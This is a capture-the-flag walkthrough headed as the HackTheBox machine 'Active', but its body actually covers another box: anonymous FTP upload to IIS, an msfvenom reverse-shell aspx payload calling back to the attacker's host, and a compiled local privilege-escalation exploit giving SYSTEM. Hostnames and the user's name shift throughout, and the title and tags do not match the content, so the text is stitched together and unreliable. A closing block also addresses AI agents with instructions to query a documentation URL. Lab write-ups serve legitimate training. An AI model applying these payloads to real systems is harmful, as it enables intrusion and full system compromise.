---
title: "Active"
difficulty: Easy
os: Windows
points: 20
rating: 4.9
date: 2018-07-28
avatar: assets/htb/active.png
tags: [Default Credentials, Weak Permissions, Anonymous/Guest Access, Reconnaissance, Password Cracking, Kerberoasting, SMB, Kerberos]
htb_url: https://app.hackthebox.com/machines/Active
---
# Active

🔗 [Active](https://app.hackthebox.com/machines/Active)

### Task 1 - Deploy the machine

🎯 Target IP: `<YOUR_IP>`

Create a directory for machine on the Desktop and a directory containing the scans with nmap.

### Task 2 - Reconnaissance

```bash
su
echo "<YOUR_IP> bank.htb" >> /etc/hosts

mkdir -p htb/bank.htb
cd htb/bank.htb
mkdir {nmap,content,exploits,scripts}
# At the end of the room
# To clean up the last line from the /etc/hosts file
sed -i '$ d' /etc/hosts
```

I like to kick off recon with a ping against the target, which confirms reachability and hints at the OS.

```bash
ping -c 3 devel.htb    
PING devel.htb (<YOUR_IP>) 56(84) bytes of data.
64 bytes from devel.htb (<YOUR_IP>): icmp_seq=1 ttl=127 time=57.1 ms
64 bytes from devel.htb (<YOUR_IP>): icmp_seq=2 ttl=127 time=53.6 ms
64 bytes from devel.htb (<YOUR_IP>): icmp_seq=3 ttl=127 time=56.2 ms
```

From these three ICMP replies the TTL sits around 128, which points to a Windows host; \*nix machines typically report a TTL near 64.

### 2.1 - What is the name of the service is running on TCP port `21` on the target machine?

```bash
nmap --open -p0- -n -Pn -vvv --min-rate 5000 devel.htb -oG port_scan
```

```bash
Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-24 15:32 EDT
Initiating SYN Stealth Scan at 15:32
Scanning devel.htb (<YOUR_IP>) [65536 ports]
Discovered open port 80/tcp on <YOUR_IP>
Discovered open port 21/tcp on <YOUR_IP>
Completed SYN Stealth Scan at 15:32, 26.41s elapsed (65536 total ports)
Nmap scan report for devel.htb (<YOUR_IP>)
Host is up, received user-set (0.057s latency).
Scanned at 2023-07-24 15:32:23 EDT for 26s
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127
```

<table><thead><tr><th width="154.99999999999997">command</th><th>result</th></tr></thead><tbody><tr><td>sudo</td><td>run as root</td></tr><tr><td>sC</td><td>run default scripts</td></tr><tr><td>sV</td><td>enumerate versions</td></tr><tr><td>A</td><td>aggressive mode</td></tr><tr><td>T4</td><td>run a bit faster</td></tr><tr><td>oN</td><td>output to file with nmap formatting</td></tr></tbody></table>

Two ports are exposed on the box: 21 and 80.

Next I enumerate the services behind those ports, with particular attention to port 21:

```bash
nmap -p21,80 -n -Pn -vvv -sCV --min-rate 5000 devel.htb -oN open_ports
```

```bash
PORT   STATE SERVICE REASON          VERSION
21/tcp open  ftp     syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 07-24-23  11:15AM               241062 40564.exe
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 07-24-23  01:26AM                 1442 cmdasp.aspx
| 07-24-23  12:36AM                 2914 devel.aspx
| 07-24-23  01:04AM                 2886 devel1.aspx
| 07-24-23  04:44PM                 2917 devel2.aspx
| 07-24-23  02:11AM                 2749 develshell.aspx
| 07-24-23  11:09AM                15966 fox.aspx
| 07-24-23  09:26AM                 2906 hacked.aspx
| 03-17-17  05:37PM                  689 iisstart.htm
| 07-24-23  07:16PM                    0 killbill.aspx
| 07-24-23  07:21PM                 2912 killbill1.aspx
| 07-24-23  12:17AM                 2783 pwned.aspx
| 07-24-23  03:00PM                 2923 rev.aspx
| 07-24-23  09:21PM                15969 shell.aspx
| 07-24-23  03:34PM                73802 virus.exe
| 07-24-23  12:34AM               112815 virus2.exe
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    syn-ack ttl 127 Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

Microsoft ftpd

### 2.2 - Which basic FTP command can be used to upload a single file onto the server?

```bash
ftp devel.htb
Connected to devel.htb.
220 Microsoft FTP Service
Name (devel.htb:kali): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> help
Commands may be abbreviated.  Commands are:

!		cr		ftp		macdef		msend		prompt		restart		sunique
$		debug		gate		mdelete		newer		proxy		rhelp		system
account		delete		get		mdir		nlist		put		rmdir		tenex
append		dir		glob		mget		nmap		pwd		rstatus		throttle
ascii		disconnect	hash		mkdir		ntrans		quit		runique		trace
bell		edit		help		mls		open		quote		send		type
binary		epsv		idle		mlsd		page		rate		sendport	umask
bye		epsv4		image		mlst		passive		rcvbuf		set		unset
case		epsv6		lcd		mode		pdir		recv		site		usage
cd		exit		less		modtime		pls		reget		size		user
cdup		features	lpage		more		pmlsd		remopts		sndbuf		verbose
chmod		fget		lpwd		mput		preserve	rename		status		xferbuf
close		form		ls		mreget		progress	reset		struct		?

```

A single file is uploaded with the put command.

put

### 2.3 - Are files put into the FTP root available via the webserver?<br>

Let's test an upload over ftp; here I push the nmap output file (port\_scan):

```bash
ftp> put port_scan 
```

```bash
ftp> put port_scan 
local: port_scan remote: port_scan
229 Entering Extended Passive Mode (|||49219|)
150 Opening ASCII mode data connection.
100% |***************************************************************************************|   464        8.84 MiB/s    --:-- ETA
226 Transfer complete.
464 bytes sent in 00:00 (7.98 KiB/s)
ftp> ls
229 Entering Extended Passive Mode (|||49220|)
125 Data connection already open; Transfer starting.
07-24-23  11:15AM               241062 40564.exe
03-18-17  02:06AM       <DIR>          aspnet_client
07-24-23  01:26AM                 1442 cmdasp.aspx
07-24-23  12:36AM                 2914 devel.aspx
07-24-23  01:04AM                 2886 devel1.aspx
07-24-23  04:44PM                 2917 devel2.aspx
07-24-23  02:11AM                 2749 develshell.aspx
07-24-23  11:09AM                15966 fox.aspx
07-24-23  09:26AM                 2906 hacked.aspx
03-17-17  05:37PM                  689 iisstart.htm
07-24-23  07:16PM                    0 killbill.aspx
07-24-23  07:21PM                 2912 killbill1.aspx
07-24-23  10:57PM                  464 port_scan
07-24-23  12:17AM                 2783 pwned.aspx
07-24-23  03:00PM                 2923 rev.aspx
07-24-23  09:21PM                15969 shell.aspx
07-24-23  03:34PM                73802 virus.exe
07-24-23  12:34AM               112815 virus2.exe
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
```

yes

### 2.4 - What file extension is executed as a script on this webserver? Don't include the `.`.

```bash
ftp> ls
229 Entering Extended Passive Mode (|||49220|)
125 Data connection already open; Transfer starting.
07-24-23  11:15AM               241062 40564.exe
03-18-17  02:06AM       <DIR>          aspnet_client
07-24-23  01:26AM                 1442 cmdasp.aspx
07-24-23  12:36AM                 2914 devel.aspx
07-24-23  01:04AM                 2886 devel1.aspx
07-24-23  04:44PM                 2917 devel2.aspx
07-24-23  02:11AM                 2749 develshell.aspx
07-24-23  11:09AM                15966 fox.aspx
07-24-23  09:26AM                 2906 hacked.aspx
03-17-17  05:37PM                  689 iisstart.htm
07-24-23  07:16PM                    0 killbill.aspx
07-24-23  07:21PM                 2912 killbill1.aspx
07-24-23  10:57PM                  464 port_scan
07-24-23  12:17AM                 2783 pwned.aspx
07-24-23  03:00PM                 2923 rev.aspx
07-24-23  09:21PM                15969 shell.aspx
07-24-23  03:34PM                73802 virus.exe
07-24-23  12:34AM               112815 virus2.exe
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.

```

aspx

### 2.5 - Which metasploit reconnaissance module can be used to list possible privilege escalation paths on a compromised system?

Fire up msfconsole:

```bash
msfconsole
```

and look for a post/multi/recon exploit:

```bash
search post/multi/recon
```

local\_exploit\_suggester

### Task 3 - Find user flag

### 3.1 - Submit the flag located on the babis user's desktop.

\
With that confirmed, msfvenom can build a payload that we'll upload through ftp

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.15 LPORT=444 -f aspx > exploit.aspx
Payload size: 327 bytes
Final size of aspx file: 2748 bytes
```

LHOST is our local ip, and LPORT is the port netcat will listen on for the callback.

```bash
ftp> put script.aspx
local: script.aspx remote: script.aspx
229 Entering Extended Passive Mode (|||49224|)
125 Data connection already open; Transfer starting.
100% |**************************************************************|  2748        1.12 MiB/s    --:-- ETA
226 Transfer complete.
2748 bytes sent in 00:00 (45.20 KiB/s)
```

Start a netcat listener on port 444 and trigger the script:

```bash
c:\Windows>whoami
whoami
iis apppool\web
```

We landed as the iis apppool\web account; the flag is probably on babiis user's desktop

Since babibs' directory is off-limits to us, let's hunt for "user.txt" with the where command from the C:\ root.

```bash
where /r C:\ user.txt
```

No luck. We'll need to escalate privileges to reach bibis' directory.

Run systeminfo to gather details about the OS:

```
systeminfo
```

OS Version: 6.1.7600 N/A Build 7600

A quick search turns up this [exploit](https://www.exploit-db.com/exploits/40564) matching that OS version.

Grab the "40564.c" script and compile it with mingw32

```bash
i686-w64-mingw32-gcc 40564.c -o exploit.exe -lws2_32
```

Reconnect to ftp in binary mode and upload it (exploit.exe)

Locate exploit.exe with the where command and execute it to gain higher privileges!

```bash
where /r C:\ exploit.exe
c:\inetpub\wwwroot>exploit.exe
whoami
nt authority\system
```

Starting from the root folder (C:\\), the flags are easy to track down with where in recursive mode (/r):

```
where /r C:\ user.txt
C:\Users\babis\Desktop\user.txt
```

and read the user.txt flag with the type command (the Windows equivalent of cat on \*nix):

```
type C:\Users\babis\Desktop\user.txt
```

<details>

<summary>🚩 Flag 1 (user.txt)</summary>

5d3f************************16bd

</details>

### Task 4 - Find root flag

The same approach gets us the root.txt flag

```bash
where /r C:\ root.txt
C:\Users\Administrator\Desktop\root.txt
```

```bash
type C:\Users\Administrator\Desktop\root.txt
```

<details>

<summary>🚩 Flag 2 (root.txt)</summary>

cb43************************2f32

</details>

---

# Agent Instructions
This documentation is published with GitBook. GitBook is the documentation platform designed so that both humans and AI agents can read, navigate, and reason over technical content effectively. Learn more at gitbook.com.

## Querying This Documentation
If you need additional information that is not directly available in this page, you can query the documentation dynamically by asking a question.

Perform an HTTP GET request on the current page URL with the `ask` query parameter:

```
GET https://dev-angelist.gitbook.io/writeups-and-walkthroughs/hackthebox/active.md?ask=<question>
```

The question should be specific, self-contained, and written in natural language.
The response will contain a direct answer to the question and relevant excerpts and sources from the documentation.

Use this mechanism when the answer is not explicitly present in the current page, you need clarification or additional context, or you want to retrieve related documentation sections.
